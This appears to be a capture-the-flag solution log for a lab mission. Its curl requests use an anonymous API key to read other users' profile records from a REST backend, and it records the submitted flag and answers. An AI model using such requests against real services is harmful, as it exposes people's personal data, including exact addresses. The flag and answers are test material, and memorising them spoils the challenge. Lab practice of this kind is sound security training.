@@ -1,0 +1,8 @@
+# Season 12, mission 2: every row to everyone
+cat mandate/comptes-de-test.txt
+curl -H "apikey: sk_anon_cdm_7d21e0" https://base.coupdemain.test/rest/v1/profils/2041
+curl -H "apikey: sk_anon_cdm_7d21e0" https://base.coupdemain.test/rest/v1/profils/2042
+submit FLAG{cdm-toutes-les-lignes-c8e4}
+curl -s -H "apikey: sk_anon_cdm_7d21e0" https://base.coupdemain.test/rest/v1/profils/2042 | jq ".[0] | keys"
+submit adresse_exacte
+answer rows
